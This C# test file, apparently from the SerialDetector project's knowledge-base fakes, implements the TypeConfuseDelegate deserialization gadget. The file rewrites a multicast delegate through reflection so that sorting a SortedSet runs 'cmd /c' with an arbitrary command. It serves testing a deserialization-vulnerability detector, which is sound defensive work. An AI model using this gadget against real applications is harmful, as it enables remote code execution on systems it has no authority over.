using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using SerialDetector.KnowledgeBase;

namespace SerialDetector.Tests.KnowledgeBaseFake
{
    internal class TypeConfuseDelegateFake : IGadget
    {
        public object Build(string command)
        {
            var singleDelegate = new Comparison<string>(String.Compare);
            var multiDelegate = singleDelegate + singleDelegate;
            var comparer = Comparer<string>.Create(multiDelegate);
            var sortedSet = new SortedSet<string>(comparer);

            var invocationList = multiDelegate.GetInvocationList();
            invocationList[1] = new Func<string, string, Process>(Process.Start);
            var field = typeof(MulticastDelegate).GetField("_invocationList",
                BindingFlags.NonPublic | BindingFlags.Instance);
            field.SetValue(multiDelegate, invocationList);

            sortedSet.Add($"/c {command}");
            sortedSet.Add("cmd");
            
            return sortedSet;
        }
    }
}